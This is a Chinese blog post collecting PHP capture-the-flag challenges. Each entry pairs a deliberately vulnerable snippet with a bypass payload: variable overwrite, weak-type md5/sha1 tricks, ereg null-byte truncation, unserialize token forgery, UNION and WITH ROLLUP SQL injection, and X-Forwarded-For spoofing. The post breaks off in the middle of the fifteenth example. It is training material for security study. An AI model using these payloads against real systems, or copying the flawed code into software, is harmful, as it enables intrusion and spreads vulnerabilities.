<!DOCTYPE HTML>
<html lang="zh-CN">


<head><meta name="generator" content="Hexo 3.9.0">
    <meta charset="utf-8">
    <meta name="keywords" content="CTF中一些PHP问题小结, Scorpio">
    <meta name="description" content="来自https://hackfun.org/  Orz
CTF中一些PHP问题小结# 1  extract变量覆盖code
&amp;lt;?php
$flag=&amp;#39;xxx&amp;#39;;
extract($_GET);
 if(isset($s">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="renderer" content="webkit|ie-stand|ie-comp">
    <meta name="mobile-web-app-capable" content="yes">
    <meta name="format-detection" content="telephone=no">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <title>CTF中一些PHP问题小结 | Scorpio</title>
    <link rel="icon" type="image/png" href="/favicon.png">

    <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/materialize/materialize.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/aos/aos.css">
    <link rel="stylesheet" type="text/css" href="/libs/animate/animate.min.css">
    <link rel="stylesheet" type="text/css" href="/libs/lightGallery/css/lightgallery.min.css">
    <link rel="stylesheet" type="text/css" href="/css/matery.css">
    <link rel="stylesheet" type="text/css" href="/css/my.css">
    <style type="text/css">
        
    </style>

    <script src="/libs/jquery/jquery-2.2.0.min.js"></script>
<link rel="stylesheet" href="/css/prism-tomorrow.css" type="text/css"></head>


<body>

<header class="navbar-fixed">
    <nav id="headNav" class="bg-color nav-transparent">
        <div id="navContainer" class="nav-wrapper container">
            <div class="brand-logo">
                <a href="/" class="waves-effect waves-light">
                    
                    <span class="logo-span">Scorpio</span>
                </a>
            </div>
            

<a href="#" data-target="mobile-nav" class="sidenav-trigger button-collapse"><i class="fa fa-navicon"></i></a>
<ul class="right">
    
    <li class="hide-on-med-and-down">
        <a href="/" class="waves-effect waves-light">
            
            <i class="fa fa-home"></i>
            
            <span>首页</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/tags" class="waves-effect waves-light">
            
            <i class="fa fa-tags"></i>
            
            <span>标签</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/categories" class="waves-effect waves-light">
            
            <i class="fa fa-bookmark"></i>
            
            <span>分类</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/archives" class="waves-effect waves-light">
            
            <i class="fa fa-archive"></i>
            
            <span>归档</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/about" class="waves-effect waves-light">
            
            <i class="fa fa-user-circle-o"></i>
            
            <span>关于</span>
        </a>
    </li>
    
    <li class="hide-on-med-and-down">
        <a href="/friends" class="waves-effect waves-light">
            
            <i class="fa fa-address-book"></i>
            
            <span>友情链接</span>
        </a>
    </li>
    
    <li>
        <a href="#searchModal" class="modal-trigger waves-effect waves-light">
            <i id="searchIcon" class="fa fa-search" title="搜索"></i>
        </a>
    </li>
</ul>

<div id="mobile-nav" class="side-nav sidenav">

    <div class="mobile-head bg-color">
        
        <div class="logo-name">Scorpio</div>
        <div class="logo-desc">
            
            每个人都应该拥有自己的梦想
            
        </div>
    </div>

    

    <ul class="menu-list mobile-menu-list">
        
        <li>
            <a href="/" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-home"></i>
                
                首页
            </a>
        </li>
        
        <li>
            <a href="/tags" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-tags"></i>
                
                标签
            </a>
        </li>
        
        <li>
            <a href="/categories" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-bookmark"></i>
                
                分类
            </a>
        </li>
        
        <li>
            <a href="/archives" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-archive"></i>
                
                归档
            </a>
        </li>
        
        <li>
            <a href="/about" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-user-circle-o"></i>
                
                关于
            </a>
        </li>
        
        <li>
            <a href="/friends" class="waves-effect waves-light">
                
                <i class="fa fa-fw fa-address-book"></i>
                
                友情链接
            </a>
        </li>
        
        
        <li><div class="divider"></div></li>
        <li>
            <a href="https://github.com/mGsuhy/Gsuhy.github.io" class="waves-effect waves-light" target="_blank">
                <i class="fa fa-github-square fa-fw"></i>Fork Me
            </a>
        </li>
        
    </ul>
</div>

        </div>

        
            <style>
    .nav-transparent .github-corner {
        display: none !important;
    }

    .github-corner {
        position: absolute;
        z-index: 10;
        top: 0;
        right: 0;
        border: 0;
        transform: scale(1.1);
    }

    .github-corner svg {
        color: #0f9d58;
        fill: #fff;
        height: 64px;
        width: 64px;
    }

    .github-corner:hover .octo-arm {
        animation: a 0.56s ease-in-out;
    }

    .github-corner .octo-arm {
        animation: none;
    }

    @keyframes a {
        0%,
        to {
            transform: rotate(0);
        }
        20%,
        60% {
            transform: rotate(-25deg);
        }
        40%,
        80% {
            transform: rotate(10deg);
        }
    }
</style>

<a href="https://github.com/mGsuhy/Gsuhy.github.io" class="github-corner tooltipped hide-on-med-and-down" target="_blank"
   data-tooltip="Fork Me" data-position="left" data-delay="50">
    <svg viewBox="0 0 250 250" aria-hidden="true">
        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path>
        <path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2"
              fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
        <path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z"
              fill="currentColor" class="octo-body"></path>
    </svg>
</a>
        
    </nav>

</header>





<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/1.jpg')">
    <div class="container">
        <div class="row">
            <div class="col s12 m12 l12">
                <div class="brand">
                    <div class="description center-align post-title">
                        CTF中一些PHP问题小结
                    </div>
                </div>
            </div>
        </div>
    </div>
</div>



<main class="post-container content">

    
    <link rel="stylesheet" href="/libs/tocbot/tocbot.css">
<style>
    #articleContent h1::before,
    #articleContent h2::before,
    #articleContent h3::before,
    #articleContent h4::before,
    #articleContent h5::before,
    #articleContent h6::before {
        display: block;
        content: " ";
        height: 100px;
        margin-top: -100px;
        visibility: hidden;
    }

    #articleContent :focus {
        outline: none;
    }

    .toc-fixed {
        position: fixed;
        top: 64px;
    }

    .toc-widget {
        padding-left: 20px;
    }

    .toc-widget .toc-title {
        margin: 35px 0 15px 0;
        padding-left: 17px;
        font-size: 1.5rem;
        font-weight: bold;
        line-height: 1.5rem;
    }

    .toc-widget ol {
        padding: 0;
        list-style: none;
    }

    #toc-content ol {
        padding-left: 10px;
    }

    #toc-content ol li {
        padding-left: 10px;
    }

    #toc-content .toc-link:hover {
        color: #42b983;
        font-weight: 700;
        text-decoration: underline;
    }

    #toc-content .toc-link::before {
        background-color: transparent;
        max-height: 25px;
    }

    #toc-content .is-active-link {
        color: #42b983;
    }

    #toc-content .is-active-link::before {
        background-color: #42b983;
    }

    #floating-toc-btn {
        position: fixed;
        right: 20px;
        bottom: 76px;
        padding-top: 15px;
        margin-bottom: 0;
        z-index: 998;
    }

    #floating-toc-btn .btn-floating {
        width: 48px;
        height: 48px;
    }

    #floating-toc-btn .btn-floating i {
        line-height: 48px;
        font-size: 1.4rem;
    }
</style>
<div class="row">
    <div id="main-content" class="col s12 m12 l9">
        <!-- 文章内容详情 -->
<div id="artDetail">
    <div class="card">
        <div class="card-content article-info">
            <div class="row tag-cate">
                <div class="col s7">
                    
                    <div class="article-tag">
                        
                            <a href="/tags/CTF/" target="_blank">
                                <span class="chip bg-color">CTF</span>
                            </a>
                        
                            <a href="/tags/PHP/" target="_blank">
                                <span class="chip bg-color">PHP</span>
                            </a>
                        
                    </div>
                    
                </div>
                <div class="col s5 right-align">
                    
                    <div class="post-cate">
                        <i class="fa fa-bookmark fa-fw icon-category"></i>
                        
                            <a href="/categories/CTF/" class="post-category" target="_blank">
                                CTF
                            </a>
                        
                    </div>
                    
                </div>
            </div>

            <div class="post-info">
                <div class="post-date info-break-policy">
                    <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
                    2018-03-18
                </div>

                
                    
                    <div class="info-break-policy">
                        <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
                        4.5k
                    </div>
                    

                    
                    <div class="info-break-policy">
                        <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
                        23 分
                    </div>
                    
                
				
				
                    <div id="busuanzi_container_page_pv" class="info-break-policy">
                        <i class="fa fa-eye fa-fw"></i>阅读次数:&nbsp;&nbsp;
                        <span id="busuanzi_value_page_pv"></span>
                    </div>
				
            </div>
        </div>
        <hr class="clearfix">
        <div class="card-content article-card-content">
            <div id="articleContent">
                <p>来自<a href="https://hackfun.org/" target="_blank" rel="noopener">https://hackfun.org/</a>  Orz</p>
<h2 id="CTF中一些PHP问题小结"><a href="#CTF中一些PHP问题小结" class="headerlink" title="CTF中一些PHP问题小结"></a>CTF中一些PHP问题小结</h2><h3 id="1-extract变量覆盖"><a href="#1-extract变量覆盖" class="headerlink" title="# 1  extract变量覆盖"></a># 1  extract变量覆盖</h3><p><strong>code</strong></p>
<pre><code>&lt;?php
$flag=&#39;xxx&#39;;
extract($_GET);
 if(isset($shiyan))
 {
    $content=trim(file_get_contents($flag));
    if($shiyan==$content)
    {
        echo&#39;ctf{xxx}&#39;;
    }
   else
   {
    echo&#39;Oh.no&#39;;
   }
   }
?&gt;</code></pre><h5 id="payload"><a href="#payload" class="headerlink" title="payload"></a>payload</h5><p><code>http://127.0.0.1/233.php?shiyan=&amp;flag=1</code><br><img src="/img/1521205930348.png" alt="Alt text"></p>
<h3 id="2-绕过trim函数过滤"><a href="#2-绕过trim函数过滤" class="headerlink" title="# 2  绕过trim函数过滤"></a># 2  绕过trim函数过滤</h3><p><strong>code</strong></p>
<pre><code>&lt;?php

$info = &quot;&quot;;
$req = [];
$flag=&quot;xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&quot;;

ini_set(&quot;display_error&quot;, false); //为一个配置选项设置值
error_reporting(0); //关闭所有PHP错误报告

if(!isset($_GET[&#39;number&#39;])){
   header(&quot;hint:26966dc52e85af40f59b4fe73d8c323a.txt&quot;); //HTTP头显示hint 26966dc52e85af40f59b4fe73d8c323a.txt

   die(&quot;have a fun!!&quot;); //die — 等同于 exit()

}

foreach([$_GET, $_POST] as $global_var) {  //foreach 语法结构提供了遍历数组的简单方式
    foreach($global_var as $key =&gt; $value) {
        $value = trim($value);  //trim — 去除字符串首尾处的空白字符（或者其他字符）
        is_string($value) &amp;&amp; $req[$key] = addslashes($value); // is_string — 检测变量是否是字符串，addslashes — 使用反斜线引用字符串
    }
}


function is_palindrome_number($number) {
    $number = strval($number); //strval — 获取变量的字符串值
    $i = 0;
    $j = strlen($number) - 1; //strlen — 获取字符串长度
    while($i &lt; $j) {
        if($number[$i] !== $number[$j]) {
            return false;
        }
        $i++;
        $j--;
    }
    return true;
}


if(is_numeric($_REQUEST[&#39;number&#39;])) //is_numeric — 检测变量是否为数字或数字字符串
{

   $info=&quot;sorry, you cann&#39;t input a number!&quot;;

}
elseif($req[&#39;number&#39;]!=strval(intval($req[&#39;number&#39;]))) //intval — 获取变量的整数值
{

     $info = &quot;number must be equal to it&#39;s integer!! &quot;;  

}
else
{

     $value1 = intval($req[&quot;number&quot;]);
     $value2 = intval(strrev($req[&quot;number&quot;]));  

     if($value1!=$value2){
          $info=&quot;no, this is not a palindrome number!&quot;;
     }
     else
     {

          if(is_palindrome_number($req[&quot;number&quot;])){
              $info = &quot;nice! {$value1} is a palindrome number!&quot;;
          }
          else
          {
             $info=$flag;
          }
     }

}

echo $info;
?&gt;</code></pre><p>这段代码中，由于<code>is_numeric</code>没有检测<code>\0(%00)</code>，所以导致其中<code>is_numeric($_REQUEST[&#39;number&#39;])</code>为false，成功跳过检测。由于trim函数没有过滤<code>\f(%0c)</code>，而intval函数跳过<code>\f(%0c)</code>，导致<code>$value1</code>和<code>$value2</code>相等，进入到<code>is_palindrome_number</code>函数成功通过<code>$number[$i] != $number[$j]</code>检测返回false，最终进入到获取<code>$flag</code>的<code>else</code>里。</p>
<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h5><p><code>?number=%0c123</code></p>
<h3 id="3-多重加密"><a href="#3-多重加密" class="headerlink" title="# 3 多重加密"></a># 3 多重加密</h3><p><strong>code</strong></p>
<pre><code>&lt;?php
    include &#39;common.php&#39;;
    $requset = array_merge($_GET, $_POST, $_COOKIE);
    //把一个或多个数组合并为一个数组
    class db
    {
        public $where;
        function __wakeup()
        {
            if(!empty($this-&gt;where))
            {
                $this-&gt;select($this-&gt;where);
            }
        }
        function select($where)
        {
            $sql = mysql_query(&#39;select * from user where &#39;.$where);
            //函数执行一条 MySQL 查询。
            return @mysql_fetch_array($sql);
            //从结果集中取得一行作为关联数组，或数字数组，或二者兼有返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false
        }
    }
    if(isset($requset[&#39;token&#39;]))
    //测试变量是否已经配置。若变量已存在则返回 true 值。其它情形返回 false 值。
    {
        $login = unserialize(gzuncompress(base64_decode($requset[&#39;token&#39;])));
        //gzuncompress:进行字符串压缩
        //unserialize: 将已序列化的字符串还原回 PHP 的值
        $db = new db();
        $row = $db-&gt;select(&#39;user=\&#39;&#39;.mysql_real_escape_string($login[&#39;user&#39;]).&#39;\&#39;&#39;);
        //mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。
        if($login[&#39;user&#39;] === &#39;ichunqiu&#39;)
        {
            echo $flag;
        }else if($row[&#39;pass&#39;] !== $login[&#39;pass&#39;]){
            echo &#39;unserialize injection!!&#39;;
        }else{
            echo &quot;(╯‵□′)╯︵┴─┴ &quot;;
        }
    }
    // else{
    //     header(&#39;Location: index.php?error=1&#39;);
    // }
?&gt;</code></pre><h5 id="payload-2"><a href="#payload-2" class="headerlink" title="payload"></a>payload</h5><pre><code>&lt;?php
$arr = array([&#39;user&#39;] === &#39;ichunqiu&#39;);
$token = base64_encode(gzcompress(serialize($arr)));
print_r($token);
?&gt;

http://127.0.0.1/233.php?token=eJxLtDK0qs60MrBOAuJaAB5uBBQ=</code></pre><h3 id="4-sql注入-WITH-ROLLUP绕过"><a href="#4-sql注入-WITH-ROLLUP绕过" class="headerlink" title="# 4  sql注入 WITH ROLLUP绕过"></a># 4  sql注入 WITH ROLLUP绕过</h3><p><strong>code</strong></p>
<pre><code>&lt;?php
error_reporting(0);
if (!isset($_POST[&#39;uname&#39;]) || !isset($_POST[&#39;pwd&#39;])) {
    echo &#39;&lt;form action=&quot;&quot; method=&quot;post&quot;&gt;&#39;.&quot;&lt;br/&gt;&quot;;
    echo &#39;&lt;input name=&quot;uname&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;
    echo &#39;&lt;input name=&quot;pwd&quot; type=&quot;text&quot;/&gt;&#39;.&quot;&lt;br/&gt;&quot;;
    echo &#39;&lt;input type=&quot;submit&quot; /&gt;&#39;.&quot;&lt;br/&gt;&quot;;
    echo &#39;&lt;/form&gt;&#39;.&quot;&lt;br/&gt;&quot;;
    echo &#39;&lt;!--source: source.txt--&gt;&#39;.&quot;&lt;br/&gt;&quot;;
    die;
}
function AttackFilter($StrKey,$StrValue,$ArrReq){  
    if (is_array($StrValue)){
//检测变量是否是数组
        $StrValue=implode($StrValue);
//返回由数组元素组合成的字符串
    }
    if (preg_match(&quot;/&quot;.$ArrReq.&quot;/is&quot;,$StrValue)==1){   
//匹配成功一次后就会停止匹配
        print &quot;水可载舟，亦可赛艇！&quot;;
        exit();
    }
}
$filter = &quot;and|select|from|where|union|join|sleep|benchmark|,|\(|\)&quot;;
foreach($_POST as $key=&gt;$value){
//遍历数组
    AttackFilter($key,$value,$filter);
}
$con = mysql_connect(&quot;localhost&quot;,&quot;root&quot;,&quot;root&quot;);
if (!$con){
    die(&#39;Could not connect: &#39; . mysql_error());
}
$db=&quot;test&quot;;
mysql_select_db($db, $con);
//设置活动的 MySQL 数据库
$sql=&quot;SELECT * FROM interest WHERE uname = &#39;{$_POST[&#39;uname&#39;]}&#39;&quot;;
echo $sql;
echo &quot;&lt;/br&gt;&quot;;
$query = mysql_query($sql);
//执行一条 MySQL 查询
var_dump(mysql_num_rows($query));
echo &quot;&lt;/br&gt;&quot;;
if (mysql_num_rows($query) == 1) {
//返回结果集中行的数目
    $key = mysql_fetch_array($query);
//返回根据从结果集取得的行生成的数组，如果没有更多行则返回 false
    if($key[&#39;pwd&#39;] == $_POST[&#39;pwd&#39;]) {
        print &quot;CTF{XXXXXX}&quot;;
    }else{
        print &quot;亦可赛艇！&quot;;
    }
}else{
    print &quot;一颗赛艇！&quot;;
}
mysql_close($con);
?&gt;</code></pre><h5 id="payload-3"><a href="#payload-3" class="headerlink" title="payload"></a>payload</h5><p><code>pwd&amp;uname=admin&#39; group by pwd with rollup limit 1 offset 1#--</code></p>
<h3 id="5-ereg正则-00截断"><a href="#5-ereg正则-00截断" class="headerlink" title="# 5  ereg正则%00截断"></a># 5  ereg正则%00截断</h3><p><strong>code</strong></p>
<pre><code>&lt;?php
$flag = &quot;flag&quot;;
if (isset ($_GET[&#39;password&#39;]))
{
  if (ereg (&quot;^[a-zA-Z0-9]+$&quot;, $_GET[&#39;password&#39;]) === FALSE)
  {
    echo &#39;&lt;p&gt;You password must be alphanumeric&lt;/p&gt;&#39;;
  }
  else if (strlen($_GET[&#39;password&#39;]) &lt; 8 &amp;&amp; $_GET[&#39;password&#39;] &gt; 9999999)
   {
     if (strpos ($_GET[&#39;password&#39;], &#39;*-*&#39;) !== FALSE) //strpos — 查找字符串首次出现的位置
      {
      die(&#39;Flag: &#39; . $flag);
      }
      else
      {
        echo(&#39;&lt;p&gt;*-* have not been found&lt;/p&gt;&#39;);
       }
      }
     else
     {
        echo &#39;&lt;p&gt;Invalid password&lt;/p&gt;&#39;;
      }
   }
?&gt;</code></pre><p>ereg是处理字符串，传入数组后就返回NULL</p>
<h5 id="payload-4"><a href="#payload-4" class="headerlink" title="payload"></a>payload</h5><p><code>?password=1e9%00*-*</code></p>
<h3 id="6-strcmp比较字符串"><a href="#6-strcmp比较字符串" class="headerlink" title="# 6 strcmp比较字符串"></a># 6 strcmp比较字符串</h3><p>这个以前有写过，就不多废话了</p>
<h3 id="7-sha1-函数比较绕过"><a href="#7-sha1-函数比较绕过" class="headerlink" title="# 7 sha1()函数比较绕过"></a># 7 sha1()函数比较绕过</h3><p>先说一下sha1()函数吧。<br>sha1-计算字符串的sha1散列值<br><code>string sha1 ( string $str [, bool $raw_output = false ] )</code></p>
<h4 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h4><h5 id="str"><a href="#str" class="headerlink" title="str"></a>str</h5><p>输入字符串</p>
<h5 id="raw-output"><a href="#raw-output" class="headerlink" title="raw_output"></a>raw_output</h5><p>如果可选的 raw_output 参数被设置为 TRUE， 那么 sha1 摘要将以 20 字符长度的原始格式返回， 否则返回值是一个 40 字符长度的十六进制数字。<br><strong>利用<a href="http://www.faqs.org/rfcs/rfc3174.html" target="_blank" rel="noopener">美国安全散列算法1</a>计算字符串的sha1散列值</strong><br><strong>code</strong></p>
<pre><code>&lt;?php
$flag = &quot;flag&quot;;
if (isset($_GET[&#39;name&#39;]) and isset($_GET[&#39;password&#39;]))
{
    var_dump($_GET[&#39;name&#39;]);
    echo &quot;&lt;/br&gt;&quot;;
    var_dump($_GET[&#39;password&#39;]);
    var_dump(sha1($_GET[&#39;name&#39;]));
    var_dump(sha1($_GET[&#39;password&#39;]));
    if ($_GET[&#39;name&#39;] == $_GET[&#39;password&#39;])
        echo &#39;&lt;p&gt;Your password can not be your name!&lt;/p&gt;&#39;;
    else if (sha1($_GET[&#39;name&#39;]) === sha1($_GET[&#39;password&#39;]))
      die(&#39;Flag: &#39;.$flag);
    else
        echo &#39;&lt;p&gt;Invalid password.&lt;/p&gt;&#39;;
}
else
    echo &#39;&lt;p&gt;Login first!&lt;/p&gt;&#39;;
?&gt;</code></pre><p>由于<code>sha1()</code>函数和<code>md5()</code>函数在处理传入参数为数组时会报警并且返回NULL，所以构造两个不同数组传进去就可以绕过<code>if ($_GET[&#39;name&#39;]=$_GET[&#39;password&#39;])</code>和<code>else if (sha1($_GET[&#39;name&#39;])==sha1($_GET[&#39;password&#39;]))</code></p>
<p>#####payload<br><code>?name[]=1&amp;password[]=2</code><br>其实感觉跟md5是一样的emmmmmmm</p>
<h3 id="8-SESSION验证绕过"><a href="#8-SESSION验证绕过" class="headerlink" title="# 8  SESSION验证绕过"></a># 8  SESSION验证绕过</h3><p><strong>code</strong></p>
<pre><code>&lt;html&gt;  
&lt;head&gt;  
    &lt;title&gt;Get flag&lt;/title&gt;
&lt;/head&gt;  
&lt;body&gt;  

&lt;?php  
session_start();   

require &#39;flag.php&#39;;  

if (isset ($_GET[&#39;password&#39;])) {  
    if ($_GET[&#39;password&#39;] == $_SESSION[&#39;password&#39;])  
        die (&#39;Flag: &#39;.$flag);  
    else  
        print &#39;&lt;p class=&quot;alert&quot;&gt;Wrong guess.&lt;/p&gt;&#39;;  
}  

// Unpredictable seed  
mt_srand((microtime() ^ rand(1, 10000)) % rand(1, 10000) + rand(1, 10000));  
?&gt;  

&lt;section class=&quot;login&quot;&gt;    
        &lt;ul class=&quot;list&quot;&gt;  
        &lt;?php  
        for ($i=0; $i&lt;3; $i++)  
            print &#39;&lt;li&gt;&#39; . mt_rand (0, 0xffffff) . &#39;&lt;/li&gt;&#39;;  
        $_SESSION[&#39;password&#39;] = mt_rand (0, 0xffffff);  
        ?&gt;  
        &lt;/ul&gt;  

        &lt;form method=&quot;get&quot;&gt;  
                &lt;input type=&quot;text&quot; required name=&quot;password&quot; placeholder=&quot;Next number&quot; /&gt;&lt;br/&gt;  
                &lt;input type=&quot;submit&quot;/&gt;  
        &lt;/form&gt;  
&lt;/section&gt;  
&lt;/body&gt;  
&lt;/html&gt;</code></pre><p><code>if ($_GET[&#39;password&#39;]=$_SESSION[&#39;password&#39;])</code>，可以手动删除请求时的cookie，让<code>$_SESSION[&#39;password&#39;]</code>字段为NULL，并且让传入的password参数为NULL</p>
<h5 id="payload-5"><a href="#payload-5" class="headerlink" title="payload"></a>payload</h5><p><code>?password=</code></p>
<h3 id="9-密码md5比较绕过"><a href="#9-密码md5比较绕过" class="headerlink" title="# 9 密码md5比较绕过"></a># 9 密码md5比较绕过</h3><p>跟一般md5有丶不同嗷<del>~</del><br><strong>code</strong></p>
<pre><code>&lt;?php
//配置数据库
if($_POST[user] &amp;&amp; $_POST[pass]) {
    $conn = mysql_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;);
    mysql_select_db(&quot;test&quot;) or die(&quot;Could not select database&quot;);
    if ($conn-&gt;connect_error) {
        die(&quot;Connection failed: &quot; . mysql_error($conn));
}
//赋值
$user = $_POST[user];
$pass = md5($_POST[pass]);
//sql语句
$sql = &quot;select pwd from test where user=&#39;$user&#39;&quot;;
$query = mysql_query($sql);
if (!$query) {
    printf(&quot;Error: %s\n&quot;, mysql_error($conn));
    exit();
}
$row = mysql_fetch_array($query, MYSQL_ASSOC);
  if (($row[pwd]) &amp;&amp; (!strcasecmp($pass, $row[pwd]))) {
//如果 str1 小于 str2 返回 &lt; 0； 如果 str1 大于 str2 返回 &gt; 0；如果两者相等，返回 0。
    echo &quot;&lt;p&gt;Logged in! Key:************** &lt;/p&gt;&quot;;
}
else {
    echo(&quot;&lt;p&gt;Log in failure!&lt;/p&gt;&quot;);
  }
}
?&gt;
</code></pre><h5 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h5><p><code>?user=&#39; union select &#39;e10adc3949ba59abbe56e057f20f883e&#39; #&amp;pass=123456</code></p>
<h3 id="10-urldecode-二次编码绕过"><a href="#10-urldecode-二次编码绕过" class="headerlink" title="# 10 urldecode 二次编码绕过"></a># 10 urldecode 二次编码绕过</h3><p>就是一个<code>urldecode()</code>函数，将参数进行二次编码就行，没啥好多说的</p>
<h3 id="11-X-Forwarded-For-绕过IP"><a href="#11-X-Forwarded-For-绕过IP" class="headerlink" title="# 11 X-Forwarded-For 绕过IP"></a># 11 X-Forwarded-For 绕过IP</h3><p><strong>code</strong></p>
<pre><code>&lt;?php
function GetIP(){
if(!empty($_SERVER[&quot;HTTP_CLIENT_IP&quot;]))
    $cip = $_SERVER[&quot;HTTP_CLIENT_IP&quot;];
else if(!empty($_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;]))
    $cip = $_SERVER[&quot;HTTP_X_FORWARDED_FOR&quot;];
else if(!empty($_SERVER[&quot;REMOTE_ADDR&quot;]))
    $cip = $_SERVER[&quot;REMOTE_ADDR&quot;];
else
    $cip = &quot;0.0.0.0&quot;;
return $cip;
}
$GetIPs = GetIP();
if ($GetIPs==&quot;1.1.1.1&quot;){
echo &quot;Great! Key is *********&quot;;
}
else{
echo &quot;错误！你的IP不在访问列表之内！&quot;;
}
?&gt;</code></pre><h6 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h6><p>很简单，bp抓包，然后HTTP透添加<code>X-Forwarded-For:1.1.1.1</code></p>
<h3 id="12-md5加密相等绕过"><a href="#12-md5加密相等绕过" class="headerlink" title="# 12 md5加密相等绕过"></a># 12 md5加密相等绕过</h3><p><strong>code</strong></p>
<pre><code>&lt;?php
$md51 = md5(&#39;QNKCDZO&#39;);
$a = @$_GET[&#39;a&#39;];
$md52 = @md5($a);
if(isset($a)){
if ($a != &#39;QNKCDZO&#39; &amp;&amp; $md51 == $md52) {
    echo &quot;flag{*****************}&quot;;
} else {
    echo &quot;false!!!&quot;;
}}
else{echo &quot;please input a&quot;;}
?&gt;</code></pre><p>又是PHP弱类型嘤嘤嘤<del>~</del>，随便找个<code>0exxx</code>的字符串就行</p>
<h5 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h5><p><code>?a=240610708</code></p>
<h3 id="13-intval函数向下取整"><a href="#13-intval函数向下取整" class="headerlink" title="# 13 intval函数向下取整"></a># 13 intval函数向下取整</h3><p><strong>code</strong></p>
<pre><code>&lt;?php
if($_GET[id]) {
    $conn = mysql_connect(&quot;localhost&quot;, &quot;root&quot;, &quot;root&quot;);
    mysql_select_db(&quot;test&quot;) or die(&quot;Could not select database&quot;);
    if ($conn-&gt;connect_error) {
      die(&quot;Connection failed: &quot; . mysql_error($conn));
    }
  $id = intval($_GET[id]);
  echo $id;
  $query = @mysql_fetch_array(mysql_query(&quot;select flag from ctf where id=&#39;$id&#39;&quot;));
  echo $_GET[id];
  if ($_GET[id]==1024) {
    echo &quot;&lt;p&gt;no! try again&lt;/p&gt;&quot;;
  }
  else{
    echo($query[flag]);
  }
}
?&gt;</code></pre><p>记得以前CTF遇到过，具体在哪我给忘了，反正取一个大于1024，小于1025的小数就行</p>
<h5 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h5><p><code>?id=1024.1</code></p>
<h3 id="14-strpos数组绕过NULL与ereg正则-00截断"><a href="#14-strpos数组绕过NULL与ereg正则-00截断" class="headerlink" title="# 14 strpos数组绕过NULL与ereg正则%00截断"></a># 14 strpos数组绕过NULL与ereg正则%00截断</h3><p><strong>code</strong></p>
<pre><code>&lt;?php
$flag = &quot;flag&quot;;
    if (isset ($_GET[&#39;nctf&#39;])) {
        if (@ereg (&quot;^[1-9]+$&quot;, $_GET[&#39;nctf&#39;]) === FALSE)
            echo &#39;必须输入数字才行&#39;;
        else if (strpos ($_GET[&#39;nctf&#39;], &#39;#biubiubiu&#39;) !== FALSE)   
            die(&#39;Flag: &#39;.$flag);
        else
            echo &#39;骚年，继续努力吧啊~&#39;;
    }
 ?&gt;</code></pre><p>也是平台上的一道题</p>
<h5 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h5><p>两种方法</p>
<ul>
<li>法一(我不知道的方法)：<br>按题目要求，既要是数字，又要有<code>#biubiubiu</code>，<code>strpos()</code>要的是字符串，那么传一个数组给他，那么返回NULL，而NULL=false，so it is right。<br>所以<code>?nctf[]=</code></li>
<li>法二：<br>字符串截断，利用函数<code>ereg()</code>的NULL截断漏洞，绕过正则漏洞。同时要把#编码<br><code>?nctf=1%00%23biubiubiu</code></li>
</ul>
<h3 id="15-SQL注入or绕过"><a href="#15-SQL注入or绕过" class="headerlink" title="# 15 SQL注入or绕过"></a># 15 SQL注入or绕过</h3><p><strong>code</strong></p>
<pre><code>&lt;?php
#GOAL: login as admin,then get the flag;
error_reporting(0);
require &#39;db.inc.php&#39;;
function clean($str){
    if(get_magic_quotes_gpc()){ //get_magic_quotes_gpc — 获取当前 magic_quotes_gpc 的配置选项设置
